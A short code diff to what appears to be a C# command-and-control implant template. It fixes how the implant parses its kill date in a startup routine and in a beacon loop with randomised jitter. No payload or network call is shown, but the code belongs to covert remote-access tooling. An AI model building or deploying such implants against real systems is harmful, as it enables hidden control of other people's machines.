@@ -195,7 +195,7 @@ public class Program
 	}
 	static void primer()
 	{
-		if (Convert.ToDateTime("#REPLACEKILLDATE#") > DateTime.Now)
+		if (DateTime.ParseExact("#REPLACEKILLDATE#", "dd/MM/yyyy", CultureInfo.InvariantCulture) > DateTime.Now)
 		{
 			var u = "";
 			try
@@ -452,7 +452,7 @@ public class Program
         }
 		while (!exitvt.WaitOne((int)(new Random().Next((int)(beacontime * 1000 * (1F - dJitter)), (int)(beacontime * 1000 * (1F + dJitter))))))
 		{
-			if (Convert.ToDateTime(KillDate) < DateTime.Now)
+			if (DateTime.ParseExact(KillDate, "dd/MM/yyyy", CultureInfo.InvariantCulture) < DateTime.Now)
 			{
 				exitvt.Set();
 				continue;
